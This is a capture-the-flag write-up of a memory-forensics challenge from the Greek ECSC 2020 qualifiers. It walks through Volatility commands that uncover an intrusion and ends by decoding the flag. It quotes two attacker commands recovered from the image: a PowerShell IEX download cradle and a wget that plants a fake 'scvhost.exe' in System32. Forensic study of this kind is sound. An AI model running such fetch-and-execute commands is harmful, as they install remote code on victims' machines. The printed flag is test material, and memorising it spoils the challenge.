# Greek ECSC Quals 2020 - Forensics - Forgotten

### Description
```
We suspect that our network has been compromised. Could you investigate and see if there's any suspicious activity?
```
The challenge provides a `forgotten.raw` file. First things first, we open **volatility** to analyze it. 
Not knowing a lot about forensics, these 2 were my guides: 
* https://github.com/volatilityfoundation/volatility/wiki/Command-Reference
* volatility -h

So, we start by executing:
```sh
$ volatility -f ./forgotten.raw imageinfo
```
Results: 
```
Volatility Foundation Volatility Framework 2.6
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win8SP0x64, Win2012R2x64_18340, Win2012R2x64, Win2012x64, Win8SP1x64_18340, Win8SP1x64
                     AS Layer1 : SkipDuplicatesAMD64PagedMemory (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/w3th4nds/ctfs/ecsc2020_quals/forensics/forg/forgotten.raw)
                      PAE type : No PAE
                           DTB : 0x1aa000L
                          KDBG : 0xf80070720530L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0xfffff8007077d000L
             KUSER_SHARED_DATA : 0xfffff78000000000L
           Image date and time : 2020-04-22 10:07:20 UTC+0000
     Image local date and time : 2020-04-22 15:37:20 +0530
```
From this information, we are interested in the ` Suggested profile(s)`
After many tries, I found that the correct profile is the **second** and **not** the **first** one.  
profile: `Win81U1x64`

After trying many of the commands of the -h manual, `clipboard` was the one that brought me some interesting results.
```
$ volatility -f ./forgotten.raw --profile=Win81U1x64 clipboard
```

Results:
```
Volatility Foundation Volatility Framework 2.6
Session    WindowStation Format                         Handle Object             Data                                              
---------- ------------- ------------------ ------------------ ------------------ --------------------------------------------------
         1 WinSta0       CF_UNICODETEXT               0x15016b 0xfffff901406ee3b0 IEX(New-Object Net.WebCl...68.153.132/script.ps1')
         1 WinSta0       0x0L                             0x10 ------------------                                                   
         1 WinSta0       0x0L                              0x0 ------------------                                                   
         1 WinSta0       CF_TEXT                0x200000000000 ------------------                                                   
         1 ------------- ------------------           0x16008f 0xfffff9014073b2f0 
```
I searched the internet and found that **IEX** is related to `powershell` so my next thought was to extract the event logs to see if something was typed in cmd or what was downloaded and relate it to powershell.
The commands I tried from the -h did not help me. 
I searched for an extractor at google and got this: https://www.andreafortuna.org/2017/07/20/how-to-recover-event-logs-from-a-windows-memory-image/
After installing the tool, we execute the command:
```sh
$ ./evtxtract forgotten.raw > out.xml
```
Opening the .xml in an editor and search for "powershell".
First thing we found: 
```
Host Application = C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c wget -Uri http://192.157.3.33/scvhost.exe -outfile C:\windows\system32\scvhost.exe
```
Now that we found the "malicious" file, we need to dump it in order to analyze it.
In order to dump it, we need to find it's offset.
The `filescan` command will do the job.
```
$ volatility -f ./forgotten.raw --profile=Win81U1x64 filescan | grep "scvhost.exe"
Volatility Foundation Volatility Framework 2.6
0x000000003d82c6d0     26      0 R--r-d \Device\HarddiskVolume1\Windows\System32\scvhost.exe
```

Now that we found the offset, we need to dump it.
Once again, our friend -h will help us.
```
$ volatility -f ./forgotten.raw --profile=Win81U1x64 dumpfiles -Q 0x000000003d82c6d0 -D ./dumpfile/ 
Volatility Foundation Volatility Framework 2.6
ImageSectionObject 0x3d82c6d0   None   \Device\HarddiskVolume1\Windows\System32\scvhost.exe
DataSectionObject 0x3d82c6d0   None   \Device\HarddiskVolume1\Windows\System32\scvhost.exe
```
Now that we dumped it, we have the file `file.None.0xffffe00094bd09f0.dat`
```sh
$ file file.None.0xffffe00094bd09f0.dat 
file.None.0xffffe00094bd09f0.dat: PE32+ executable (console) x86-64, for MS Windows
```
Now it's finally time for some ***REVERSE ENGINEERING***.
Open the executable in **IDA**.
We didn't even start and in main we see many initialiazations of variables with hex values.

![ida](https://i.imgur.com/jou6Gwq.png)

Trying to convert the first value from hex to ascii and we get:
```sh
$ python -c 'print(chr(0x48))'
H
```
So we found that this is the flag.
Tiny script to convert the values.

```python
enc = [0x48,0x54,0x42,0x7b,0x41,0x6e,0x44,0x5f,0x37,0x48,0x61,0x37,0x35,0x5f,0x68,0x4f,0x57,0x5f,0x33,0x56,0x33,0x4e,0x37,0x5f,0x56,0x49,0x33,0x77,0x33,0x52,0x5f,0x57,0x6f,0x72,0x6b,0x32,0x7d]

flag = ''
for i in enc:
    flag += chr(i)
print('Flag: {}'.format(flag))
```
```sh
python3 dec.py 
Flag: HTB{AnD_7Ha75_hOW_3V3N7_VI3w3R_Work2}
```
**Flag: HTB{AnD_7Ha75_hOW_3V3N7_VI3w3R_Work2}** 

